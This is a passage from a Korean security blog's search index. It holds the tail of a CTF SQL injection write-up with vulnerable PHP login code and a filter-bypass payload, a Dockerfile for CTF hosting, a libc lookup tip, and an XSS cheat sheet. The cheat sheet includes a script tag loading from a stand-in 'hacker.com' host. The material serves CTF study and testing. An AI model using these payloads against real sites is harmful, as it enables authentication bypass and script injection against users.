class="variable">$query</span> = <span class="string">&quot;SELECT * FROM `users` WHERE `id` = trim(&#x27;<span class="subst">&#123;$id&#125;</span>&#x27;) AND `pw` = trim(&#x27;<span class="subst">&#123;$pw&#125;</span>&#x27;)&quot;</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysqli_fetch_array(mysqli_query(<span class="variable">$conn</span>, <span class="variable">$query</span>)); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>) </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;<span class="subst">&#123;$flag&#125;</span>&lt;/h1&gt;&quot;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) &#123; </span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&quot;<span class="subst">&#123;$result[&#x27;id&#x27;]&#125;</span>님 안녕하세요!&quot;</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&quot;로그인에 실패하였습니다. 다시 시도해주세요.&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>페이지 로그인 코드는 다음과 같다.<br>$id, $pw 에 입력되는 값에서 information, admin, or 등 여러가지를 필터링 한다.</p><p>이 정규식 검증 부분들은 tab, like 문자를 통해서 쿼리문을 완성할 수 있다.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span>\<span class="operator">&amp;</span>pw<span class="operator">=</span>)<span class="operator">||</span> id <span class="keyword">like</span> &quot;ad&quot; &quot;min&quot;<span class="comment">-- -</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF Web Challenge(Dockerfile)</title>
      <link href="2020/02/05/dockerfile-200205/"/>
      <url>2020/02/05/dockerfile-200205/</url>
      
        <content type="html"><![CDATA[<p>간단한 버전이라서 쓰는 사람에 맞게 적절히 수정하면 된다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:18.04</span><br><span class="line"></span><br><span class="line">ENV DEBIAN_FRONTEND=noninteractive</span><br><span class="line">ENV TERM=linux</span><br><span class="line"></span><br><span class="line">RUN apt-get update -y</span><br><span class="line">RUN apt-get install apache2 -y</span><br><span class="line">RUN apt-get install libapache2-mod-php -y</span><br><span class="line">RUN apt-get install php -y</span><br><span class="line">RUN apt-get install vim -y</span><br><span class="line"></span><br><span class="line">COPY ./files /var/www/html</span><br><span class="line">RUN rm -rf /var/www/html/index.html</span><br><span class="line">EXPOSE 포트번호</span><br><span class="line"></span><br><span class="line">CMD [<span class="string">&quot;/usr/sbin/apache2ctl&quot;</span>, <span class="string">&quot;-D&quot;</span>, <span class="string">&quot;FOREGROUND&quot;</span>]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Dockerfile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>libc database search(bluekat)</title>
      <link href="2020/02/05/pwnbluekat-200205/"/>
      <url>2020/02/05/pwnbluekat-200205/</url>
      
        <content type="html"><![CDATA[<p>예전에 포너블 공부할 때 rop 문제에서 오프셋 기반으로<br>립씨 버전 하나하나 찾으려니 솔직히 너무 귀찮았다..</p><p>그래서 찾아보다가 libc bluekat 이라는 사이트를 찾았는데,<br>함수 오프셋을 통해서 일치하는 libc 버전을 간단하게 찾아 주었다!</p><p>포너블 하신다면 자주 이용해먹으면 좋을 것 같다.</p><p>[<a href="https://libc.blukat.me]">https://libc.blukat.me]</a>(libc-bluekat homepage)</p>]]></content>
      
      
      <categories>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss cheatsheet 2020</title>
      <link href="2020/02/05/xsscheatsheet-200205/"/>
      <url>2020/02/05/xsscheatsheet-200205/</url>
      
        <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;hacker.com/hack.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>cilck me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;alert(1);&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onunload</span>=<span class="string">&quot;alert(1);&quot;</span>&gt;</span></span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"> data:text/html,<span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"> */alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>/*</span><br><span class="line"><span class="javascript"> <span class="title">constructor</span>.<span class="title">constructor</span>(<span class="params"><span class="string">&#x27;alert(/xss/)&#x27;</span></span>)(<span class="params"></span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> CheatSheet </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
